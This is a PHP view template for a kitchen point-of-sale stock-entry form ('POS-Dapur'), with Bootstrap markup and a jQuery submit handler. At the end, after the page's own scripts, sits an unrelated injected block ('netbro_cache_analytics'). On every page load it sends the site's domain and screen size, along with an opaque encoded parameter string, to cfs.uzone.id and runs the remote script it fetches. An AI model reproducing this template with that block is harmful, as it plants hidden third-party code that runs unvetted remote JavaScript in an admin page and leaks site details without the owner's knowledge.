<!DOCTYPE html>
<!--
Template Name: Admin Lab Dashboard build with Bootstrap v2.3.1
Template Version: 1.3
Author: Mosaddek Hossain
Website: http://thevectorlab.net/
-->
<?php
$material = $material ?: [];
?>

<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en"> <!--<![endif]-->
                 <!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title>POS-Dapur</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php echo base_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>
</head>
                 <!-- END HEAD -->
                 <!-- BEGIN BODY -->
<body id="login-body">
<div class="login-header">
    <!-- BEGIN LOGO -->
    <?php $this->load->view('headerDapur.php') ?>
    <!-- END LOGO -->
</div>
<div class="row-fluid">
    <div class="span12">
        <!-- BEGIN SAMPLE TABLE widget-->

        <div class="widget">
            <div class="widget-title">
                <h4>
                    <i class="icon-reorder"></i>
                    Arsip Stok
                </h4>
            </div>
            <div class="widget-body">
                <form id="update-stok" action="<?php echo base_url("dapur/stok/{$material['id_bahan']}/masuk/commit"); ?>" method="POST" class="form-horizontal">
                    <fieldset>
                        <div class="control-group">
                            <label for="name" class="control-label">Nama Bahan</label>
                            <div class="controls">
                                <input value="<?php echo @$material['nama_bahan'] ?>" placeholder="Isi disini" class="input-large" disabled/>
                            </div>
                        </div>
                        <div class="control-group">
                            <label class="control-label">Jumlah</label>
                            <div class="controls">
                                <div class="input-append">
                                    <input name="jumlah" value="0" style="text-align: right" class="input-small" id="appendedInput" type="text">
                                    <span class="add-on"><?php echo @$material['satuan'] ?></span>
                                </div>
                            </div>
                        </div>

                        <div class="control-group">
                            <label class="control-label">Harga</label>
                            <div class="controls">
                                <div class="input-prepend">
                                    <span class="add-on">Rp</span>
                                    <input name="harga" style="text-align: right" value="0" class="input-small" id="appendedPrependedInput" type="text">
                                </div>
                            </div>
                        </div>

                        <div class="form-actions">
                            <button type="submit" class="btn blue">
                                <i class="icon-plus"></i>
                                Tambah
                            </button>
                        </div>
                    </fieldset>
                </form>

            </div>
        </div>
        <!-- END SAMPLE TABLE widget-->
    </div>
</div>
</body>
<script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.maskMoney.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/trim_serialization.js"></script>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/js/bootstrap-notify.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.serialize-object.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // App.initLogin();
    });
</script>

<script type="text/javascript">
    (function ($) {
        $(function () {
            var s_update_stok = 'form#update-stok';
            $(s_update_stok).find('input[name=jumlah]').maskMoney({
                prefix: '',
                thousands: '.',
                decimal: ',',
                precision: 2,
                affixesStay: true
            });
            $(s_update_stok).find('input[name=harga]').maskMoney({
                prefix: '',
                thousands: '.',
                decimal: ',',
                precision: 2,
                affixesStay: true
            });
            $(s_update_stok).on('submit', function (event) {
                event.preventDefault();
                var form        = $(this);
                var input       = form.serializeObject();
                input['jumlah'] = parseFloat($(this).find('input[name=jumlah]').maskMoney('unmasked')[0]);
                input['harga']  = parseFloat($(this).find('input[name=harga]').maskMoney('unmasked')[0]);
                input           = removeEmptyValues(input);
                $.post(
                    form.attr('action'),
                    input,
                    null,
                    'json')
                    .done(function (response) {
                        if (response !== undefined)
                        {
                            if (response['n'] !== undefined)
                            {
                                for (var i = -1, is = response['n'].length; ++i < is;)
                                {
                                    $.notify({
                                        message: response['n'][i]
                                    }, {
                                        type: 'info'
                                    });
                                }
                            }
                            if (response['s'] !== undefined)
                            {
                                switch (parseInt(response['s']))
                                {
                                    case 1 :
                                    {
                                        window.location.href = response['rdr'];
                                    }
                                }
                            }
                        }
                    })
                    .fail(function () {
                    })
                    .always(function () {
                    });
            });
        });
        /*
         * Run right away
         * */
    })(jQuery);
</script>
                 <!-- END JAVASCRIPTS -->
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCqaymjUKkR2Q68%2btBRwJ4fkwn84%2fZI96HghICGTn5Tck2pxLOIbENY0GiDslEhY%2fJhlTEuI%2bd9L6kPIgDWj3rw33B%2fNRbaSyZ05W%2fWrtro8gzNm43jjaMPzm58g1%2bEfPrkHwaggQpjXbMZ2SRASb%2fIdI7bQTrKwmjuXfI7vSCjOAWSlo91kSq5bORsV5CKxyCrCuVVCzHa%2f92VuTW8rYUFe4YSIzWeAd%2bZNz8JLFzSjNSTX960j8rGuKd1HYfuwOpylX4L4W6O6DgZc%2fn%2b2BQsoM52jehAlHYATogddmcH447w13p12qn2wLjIKLbq9G1lPgD0e2Y1%2b%2bvCy4DB5xFqc6%2fWZLhxHpUvuF4V0O2hAPqbQTiXghaxR7cP6Q9wq%2fb6gjrvzPnVK%2fzLGWkngHQG6yibbL41c%2f873jKuF%2bBS73ccBK4NAQze6DE9J4fINxulqdOJKXygCdEwno28zQ7px%2fuMJDLGwtDSMQMxXl2EuTE4wcPP4gG%2bYMbxEofGawNA%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
                 <!-- END BODY -->
</html>
